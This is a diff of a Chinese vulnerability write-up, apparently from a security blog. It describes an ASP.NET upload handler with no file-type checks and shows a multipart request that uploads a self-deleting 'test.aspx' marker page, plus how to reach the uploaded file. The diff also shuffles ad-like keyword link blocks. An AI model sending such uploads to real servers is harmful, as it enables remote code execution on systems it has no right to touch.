@@ -16,14 +16,6 @@ asset_dir: embedded-base64
 
 # 漏洞分析
 
-深入探索
-
-网络安全
-
-网络
-
-客户关系管理
-
 直接看其业务实现逻辑
 
 ```
@@ -64,14 +56,6 @@ public class Handler : IHttpHandler
     }
 ```
 
-深入探索
-
-iOS 应用
-
-计算机服务器
-
-编程
-
 直接上传对文件类型无任何过滤或校验，造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "标签：文件上传")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。
 
 UPLOAD\_SUPPLIER\_URL 位置在 web.config 设置，一般为
@@ -99,6 +83,14 @@ Content-Disposition: form-data; name="file"; filename="test.aspx"
 <%@Page Language="C#"%><%Response.Write(Guid.NewGuid().ToString("N"));System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
 ------WebKitFormBoundary123--
 ```
+
+深入探索
+
+客户关系管理
+
+云存储
+
+iOS 应用
 
 访问上传文件 UploadBaseFolder/Supplier/响应文件名
 
